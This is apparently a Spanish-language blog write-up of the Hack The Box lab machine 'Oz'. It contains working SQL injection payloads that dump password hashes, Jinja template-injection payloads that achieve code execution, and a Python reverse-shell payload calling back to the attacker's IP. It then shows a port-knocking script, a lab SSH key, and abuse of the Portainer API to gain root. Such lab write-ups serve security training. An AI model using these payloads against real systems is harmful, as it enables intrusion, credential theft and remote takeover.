---
layout: single
title: Oz HTB - WriteUp
excerpt: WriteUp de la máquina Oz de HTB.
date: 2023-02-20
classes: wide
header:
  teaser: /assets/images/Oz/Oz.png
  teaser_home_page: true
  icon: /assets/images/Oz/Oz.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup                                                                                                                                                                                  
  - Docker                                                                                                                                                                                     
  - SSTI
  - PIVOTING
  - SQLI
---

El la tarde de hoy estaré resolvienndo la máquina Oz de HTB.

### Enumeración Inicial.

Lo primero que haremos será escanear los puertos de la máquina, para ello usaremos la herramienta nmap.

```bash
❯ nmap -sC -sV -Pn -n -oN Extraction -p80,8080 10.10.10.96
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-20 17:56 CET
Nmap scan report for 10.10.10.96
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
|_http-title: OZ webapi
|_http-trane-info: Problem with XML parsing of /evox/about
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
| http-title: GBR Support - Login
|_Requested resource was http://10.10.10.96:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
```

Solo hay dos puertos abiertos, ambos son HTTP y estan detras de Werkzeug httpd 0.14.1 ademas también se esta mostrando la version de python (2.7.14)

- El puerto 80 nos devuelve una web con el siguiente mensaje: "Please register a username!"
- El perto 8080 tiene un panel de login, de momento no disponemos de usuario y contraseña.

Por el momento voy a intentar descubrir endpoints en el puerto 80, alomejor puedo registrar usuarios...

Al enumerar intentar hacer Fuzzing he tenido un problema, todo responde con codigo de estado 200 y ademas con una cadena te texto aleatoria. Se me ha hecho algo complicado encontrar rutas validas.

```bash
❯ wfuzz --hc=404 --hw=1,4 --hh=75 -t 30 -X GET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://10.10.10.96/FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.96/FUZZ
Total requests: 1273833

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000202:   200        3 L      6 W        79 Ch       "users"
```

He encontrado una ruta llamada users. que devuelve exactamente el mismo mensaje que antes -> "Please register a username!" recordando que nmap nos devolvia la siguiente información: "http-title: OZ webapi" he intentado hacer fuzzing a partir de /users/

```bash
❯ wfuzz --hc=404 --hh=5,89 -t 30 -X GET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://10.10.10.96/users/FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.96/users/FUZZ
Total requests: 1273833

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000259:   200        1 L      1 W        21 Ch       "admin"                                                                                                                     
000002025:   500        4 L      40 W       291 Ch      "'"    
```

La ruta de admin no devolvia nada mas que un JSON que devolvia el nombre de usuario admin. 

### Explotación WEB

Si nos fijamos en el output de wfuzz, una comilla causaba  un Internal Server Error, en ese momento me fui directo a por una SQLI.

![](/assets/images/Oz/image1.png)

Nos esta devolviendo un usuario, tenemos una SQLI, es importante codificar en formato url en estos casos.

La tabla tiene unicamente una columna en uso

![](/assets/images/Oz/image2.png)

Vamos a enumerar las bases de datos existentes.
![](/assets/images/Oz/image3.png)


```bash
/users/'union select group_concat(schema_name) from information_schema.schemata-- -
```

Por ahora voy a enumerar "ozdb" voy a ver las tablas que tiene esa base de datos.

![](/assets/images/Oz/image4.png)

```bash
/users/'union select group_concat(table_name) from information_schema.tables where table_schema=database()-- -
```

Voy a sacar las columnas de "users_gbw"

![](/assets/images/Oz/image5.png)

```bash
/users/'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users_gbw'
```

Voy a extraer los datos de username y de password.

![](/assets/images/Oz/image6.png)

```bash
/users/'union select group_concat(username,":",password) from users_gbw-- -
```

Hemos extraido los siguientes datos.

```bash
dorthi:$pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78
tin.man:$pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk
wizard.oz:$pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY
coward.lyon:$pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY
toto:$pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg
admin:$pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ 
```

Voy a intentar romper los hash con john. Se estan utlizando hash **pbkdf2-sha256**. Este proceso puede tardar un rato...

Despues dun rato obtuve el siguiente resultado:

```bash
❯ aAEMJ4z5mzdg:GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY:wizardofoz22 ?
```

Las credenciales son validas en la web del puerto 8080. (wizard.oz:wizardofoz22)

Una vez dentro veo un monton de "tickets" y ademas tengo la opción de crear tickets. Recordemos que la aplicacción web esta hecha con python, eso ya me hace pensar en inyección de plantillas.

Si intento crear un ticket con el siguiente payload "{{7*7}}" obtengo 49

![](/assets/images/Oz/image7.png)

Usare el siguiente payload para ver si tengo RCE.

>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

La respuesta es la siguiente:

![](/assets/images/Oz/image8.png)

Me temo que estoy en un contenedor... Voy a intentar establecerme una revshell.


> {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/config.cfg', 'w').write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') }}

> {{ config.from_pyfile('/tmp/config.cfg') }}

### Enumeración de sistema


Si miramos nuestro listener tenemos una shell.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
10.10.10.96: inverse host lookup failed: Unknown host
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.96] 57800
/bin/sh: can't access tty; job control turned off
/app #
```

En este caso el tratamiento de la tty lo he tenido que hacer con python.

```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

Estamos en un contenedor... Si enumeramos un poco los archivos de configuración de la web podemos observar que en uno hay credenciales de conexión a una base de datos.

```python
/app/ticketer # cat database.py
#!/usr/bin/python
# -*- coding: utf-8 -*-
from flask_sqlalchemy import SQLAlchemy
from . import app
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://dorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb'
db = SQLAlchemy(app)

class Users(db.Model):
    __tablename__ = 'users_gbw'
    id = db.Column('id', db.Integer, primary_key=True)
    username = db.Column('username', db.Text, nullable=False)
    password = db.Column('password', db.Text, nullable=False)

class Tickets(db.Model):
    __tablename__ = 'tickets_gbw'
    id = db.Column('id', db.Integer, primary_key=True)
    ticket_name = db.Column('name', db.String(10), nullable=False)
    ticket_desc = db.Column('desc', db.Text, nullable=False)

db.create_all()
db.session.commit()

```

Si nos conectamos a esa base de datos veremos lo que enumeramos anteriormente a traves de la SQLI. Nos estamos conectando a otro host este puede tener mas puertos abiertos a parte del mysql.

Me he bajado un binario de nmap para escanear el host y solo tenia el puerto del msyql abierto. Ahora probare escanear la red en busqueda de mas hosts.

```bash
/tmp # ./nmap -sn 10.100.10.0/29
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-02-20 18:33 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 10.100.10.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000065s latency).
MAC Address: 02:42:B8:8F:64:F9 (Unknown)
Nmap scan report for ozdb.prodnet (10.100.10.4)
Host is up (0.000012s latency).
MAC Address: 02:42:0A:64:0A:04 (Unknown)
Nmap scan report for webapi.prodnet (10.100.10.6)
Host is up (0.000034s latency).
MAC Address: 02:42:0A:64:0A:06 (Unknown)
Nmap scan report for tix-app (10.100.10.2)
Host is up.
```

No encontre nada hasta este punto, si enumeramos el sistema de archivos podemos encontrar una carpeta llamada .secret que contiene un archivo log de knockd.

```bash
/.secret # ls -la
total 12
drwxr-xr-x    2 root     root          4096 Apr 24  2018 .
drwxr-xr-x   53 root     root          4096 Sep 22 12:46 ..
-rw-r--r--    1 root     root           262 Apr 24  2018 knockd.conf
/.secret # cat knockd.conf 
[options]
        logfile = /var/log/knockd.log

[opencloseSSH]

        sequence        = 40809:udp,50212:udp,46969:udp
        seq_timeout     = 15
        start_command   = ufw allow from %IP% to any port 22
        cmd_timeout     = 10
        stop_command    = ufw delete allow from %IP% to any port 22
        tcpflags        = syn
```

Si nos conectamos siguiendo la secuencia se abrirá el puerto 22. hice un loop por si el puerto se cerraba:

```bash 
#!/bin/bash 
ports="40809 50212 46969" 
for port in $ports; do 
	echo "[*] Knocking on ${port}"
	echo "a" | nc -u -w 1 10.10.10.96 ${port} 
	sleep 0.1 
done;
```


Si escaneamos el host veremos que tiene el puerto 22 abierto:

```bash
❯ nmap -sC -sV -Pn -n -oN Extraction -p22 10.10.10.96
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-20 19:43 CET
Nmap scan report for 10.10.10.96
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:29:8c:d2:59:a5:d8:13:ac:c2:6a:8a:b6:aa:f2:4b (RSA)
|   256 ff:d0:ba:54:e0:70:cf:b6:51:c6:d1:90:fc:02:9a:45 (ECDSA)
|_  256 36:a4:69:b1:74:8d:06:22:90:0f:9f:0d:dc:6d:87:87 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vamos a ver si las credenciales del archivo de conexion a la base de datos son validas.

```bash
❯ ssh dorthi@10.10.10.96
The authenticity of host '10.10.10.96 (10.10.10.96)' can't be established.
ECDSA key fingerprint is SHA256:6dWSFISICBFPYfpU6BkwDu9JrqpIA7EyOxQETACNxGY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.96' (ECDSA) to the list of known hosts.
dorthi@10.10.10.96: Permission denied (publickey).
```

	-.- zas en toda la boca

Algo se me estaba escapando, ¿Me falta un id_rsa? sip, me falta una clave privada ssh que podia extraer desde la inyeción SQL.

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,66B9F39F33BA0788CD27207BF8F2D0F6

RV903H6V6lhKxl8dhocaEtL4Uzkyj1fqyVj3eySqkAFkkXms2H+4lfb35UZb3WFC
b6P7zYZDAnRLQjJEc/sQVXuwEzfWMa7pYF9Kv6ijIZmSDOMAPjaCjnjnX5kJMK3F
e1BrQdh0phWAhhUmbYvt2z8DD/OGKhxlC7oT/49I/ME+tm5eyLGbK69Ouxb5PBty
h9A+Tn70giENR/ExO8qY4WNQQMtiCM0tszes8+guOEKCckMivmR2qWHTCs+N7wbz
a//JhOG+GdqvEhJp15pQuj/3SC9O5xyLe2mqL1TUK3WrFpQyv8lXartH1vKTnybd
9+Wme/gVTfwSZWgMeGQjRXWe3KUsgGZNFK75wYtA/F/DB7QZFwfO2Lb0mL7Xyzx6
ZakulY4bFpBtXsuBJYPNy7wB5ZveRSB2f8dznu2mvarByMoCN/XgVVZujugNbEcj
evroLGNe/+ISkJWV443KyTcJ2iIRAa+BzHhrBx31kG//nix0vXoHzB8Vj3fqh+2M
EycVvDxLK8CIMzHc3cRVUMBeQ2X4GuLPGRKlUeSrmYz/sH75AR3zh6Zvlva15Yav
5vR48cdShFS3FC6aH6SQWVe9K3oHzYhwlfT+wVPfaeZrSlCH0hG1z9C1B9BxMLQr
DHejp9bbLppJ39pe1U+DBjzDo4s6rk+Ci/5dpieoeXrmGTqElDQi+KEU9g8CJpto
bYAGUxPFIpPrN2+1RBbxY6YVaop5eyqtnF4ZGpJCoCW2r8BRsCvuILvrO1O0gXF+
wtsktmylmHvHApoXrW/GThjdVkdD9U/6Rmvv3s/OhtlAp3Wqw6RI+KfCPGiCzh1V
0yfXH70CfLO2NcWtO/JUJvYH3M+rvDDHZSLqgW841ykzdrQXnR7s9Nj2EmoW72IH
znNPmB1LQtD45NH6OIG8+QWNAdQHcgZepwPz4/9pe2tEqu7Mg/cLUBsTYb4a6mft
icOX9OAOrcZ8RGcIdVWtzU4q2YKZex4lyzeC/k4TAbofZ0E4kUsaIbFV/7OMedMC
zCTJ6rlAl2d8e8dsSfF96QWevnD50yx+wbJ/izZonHmU/2ac4c8LPYq6Q9KLmlnu
vI9bLfOJh8DLFuqCVI8GzROjIdxdlzk9yp4LxcAnm1Ox9MEIqmOVwAd3bEmYckKw
w/EmArNIrnr54Q7a1PMdCsZcejCjnvmQFZ3ko5CoFCC+kUe1j92i081kOAhmXqV3
c6xgh8Vg2qOyzoZm5wRZZF2nTXnnCQ3OYR3NMsUBTVG2tlgfp1NgdwIyxTWn09V0
nOzqNtJ7OBt0/RewTsFgoNVrCQbQ8VvZFckvG8sV3U9bh9Zl28/2I3B472iQRo+5
uoRHpAgfOSOERtxuMpkrkU3IzSPsVS9c3LgKhiTS5wTbTw7O/vxxNOoLpoxO2Wzb
/4XnEBh6VgLrjThQcGKigkWJaKyBHOhEtuZqDv2MFSE6zdX/N+L/FRIv1oVR9VYv
QGpqEaGSUG+/TSdcANQdD3mv6EGYI+o4rZKEHJKUlCI+I48jHbvQCLWaR/bkjZJu
XtSuV0TJXto6abznSC1BFlACIqBmHdeaIXWqH+NlXOCGE8jQGM8s/fd/j5g1Adw3
-----END RSA PRIVATE KEY-----
```

Si probamos nuevamente a conectarnos... Tenemos shell!!!

```bash
❯ ssh -i id_rsa dorthi@10.10.10.96
Enter passphrase for key 'id_rsa': 
dorthi@oz:~$
```

### Explotación del sistema

Si enumeramos los permisos de sudo podemos ver que tenemos varios privilegios sobre docker.

```bash
dorthi@oz:~$ sudo -l
Matching Defaults entries for dorthi on oz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dorthi may run the following commands on oz:
    (ALL) NOPASSWD: /usr/bin/docker network inspect *
    (ALL) NOPASSWD: /usr/bin/docker network ls
```

Existen los siguientes contenedores:

```bash
dorthi@oz:~$ sudo /usr/bin/docker network ls
NETWORK ID          NAME                DRIVER              SCOPE
8f15174b006d        bridge              bridge              local
49c1b0c16723        host                host                local
3ccc2aa17acf        none                null                local
48148eb6a512        prodnet             bridge              local
```

Vamos a analizar el contenedor "bridge" el contenedor esta en un rango que no habiamos visto anteriormente.

```json
dorthi@oz:~$ sudo /usr/bin/docker network inspect bridge                                                                                                                                     
[                                                                                                                                                                                            
    {                                                                                                                                                                                        
        "Name": "bridge",                                                                                                                                                                    
        "Id": "8f15174b006d83ef2577ebf0ab8a8fbfd6397ae8b9a933ecba0fe8f9428d0ba8",                                                                                                            
        "Created": "2023-02-20T10:54:07.416283161-06:00",                                                                                                                                    
        "Scope": "local",                                                                                                                                                                    
        "Driver": "bridge",                                                                                                                                                                  
        "EnableIPv6": false,                                                                                                                                                                 
        "IPAM": {                                                                                                                                                                            
            "Driver": "default",
            "Options": null,
            "Config": [
                {
                    "Subnet": "172.17.0.0/16",
                    "Gateway": "172.17.0.1"
                }
            ]
        },
        "Internal": false,
        "Attachable": false,
        "Containers": {
            "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {
                "Name": "portainer-1.11.1",
                "EndpointID": "ec1f0896fa197c4e4889b2ffd18e721c3bcd7f90b81f44940e1cbec53632dd93",
                "MacAddress": "02:42:ac:11:00:02",
                "IPv4Address": "172.17.0.2/16", 
                "IPv6Address": ""
            }
        },
        "Options": {
            "com.docker.network.bridge.default_bridge": "true",
            "com.docker.network.bridge.enable_icc": "true",
            "com.docker.network.bridge.enable_ip_masquerade": "true",
            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
            "com.docker.network.bridge.name": "docker0",
            "com.docker.network.driver.mtu": "1500"
        },
        "Labels": {}
    }
]
```

Ademas tiene de nombre portainer-1.11.1. ¿Estará expuesto? Esta vez use un escaner de puertos en bash para ver los servicios expuestos de ese host.
https://raw.githubusercontent.com/S12cybersecurity/Pivoting_Enum/main/port_discovery.sh

```bash
dorthi@oz:~$ bash test2.sh 172.17.0.2
List of Hosts: 172.17.0.2

[*] Scanning Ports on: 172.17.0.2

        [+] PORT 172.17.0.2:9000 OPEN
```

Tiene el puerto 9000 abierto, voy a hacer el port forwardin con SSH.

```bash
❯ ssh -L 9000:172.17.0.2:9000 -i id_rsa dorthi@10.10.10.96
Enter passphrase for key 'id_rsa': 
dorthi@oz:~$ 
```

Ahora vemos el portainer... No sirven ninguna de las credenciales de las que disponemos. Despues de leer un poco vi que portainer tenia una api desde la que se pueden establecer las credenciales.

![](/assets/images/Oz/image9.png)

Intenté esto y al parecer funciono.

```bash
❯ curl -X POST "localhost:9000/api/users/admin/init" -d "username=admin&Password=admin"
{"err":"Invalid JSON"}
❯ curl -X POST "localhost:9000/api/users/admin/init" -d '{"username":"admin","Password":"admin"}'
```

El segundo intento no me devolvio un error, asi que intente logearme. ¡La combinación fue valida!

Una vez dentro, lo que hice fue crear un contenedor, añadiendole un volumen que montara todo el host en /mnt

![](/assets/images/Oz/image10.png)

Desde portainer puedo acceder a una shell dentro del contenedor y acceder al sistema de archivos. Si quisisera una shell como root desde el ssh podria dar permisos SUID  a la bash.

![](/assets/images/Oz/image11.png)

Espero que te haya servido. Xao
